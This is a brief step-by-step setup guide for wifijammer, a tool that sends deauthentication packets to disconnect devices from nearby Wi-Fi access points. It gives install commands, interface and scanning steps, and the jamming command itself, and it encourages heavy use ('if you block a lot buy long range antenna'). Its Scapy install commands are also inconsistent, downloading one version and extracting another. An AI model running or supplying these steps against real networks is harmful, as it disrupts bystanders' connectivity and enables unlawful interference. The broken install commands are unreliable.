# Source: https://github.com/DanMcInerney/wifijammer
# Works with wireless cards capable of injection (Alfa has some good ones)
# Take care to buy one that works on 2.4 Ghz and 5 Ghz, if you block a lot buy long range antenna
# Examples: https://spoilerfoiler.com/packet-injection-wireless-card-reviews/

## Install python2.7

	sudo apt install python2
	sudo apt install python3-scapy

## Clone Repo
	git clone https://github.com/DanMcInerney/wifijammer
	cd wifijammer

## Install Scapy (replaces nmap and everything network related)
	wget https://github.com/secdev/scapy/archive/v2.4.4.tar.gz
	tar -xf v2.2.0.tar.gz
	cd scapy-v2.2.0
	sudo apt install python-setuptools
	sudo python2.7 setup.py install
	

## Connect supported wifi device

## Deactivate normal interface

### a) In the Ubuntu Wifi Settings:
Go into Ubuntu WIFI-Settings. Click on the network you are in and uncheck "Connect automatically..."

Take Wifi into Airplane mode

Take Wifi back into normal mode

### b) (or) in the terminal:
List interfaces with:
	ip a

Take down normal interface:
	ifconfig wlan0 down
## Select wlan iface
	ip a


## List Accesspoints
	sudo iwlist wlx9cefd5fbf646 scanning | egrep 'Cell |Encryption|Quality|Last beacon|ESSID|Channel'
## Start deauthenticating with

	sudo python2.7 wifijammer -a Address-from-List -c Channel-from-List --world

## Optionally: Skip an MAC Address from being jammed
Add option:
	-d -s MAC-Address
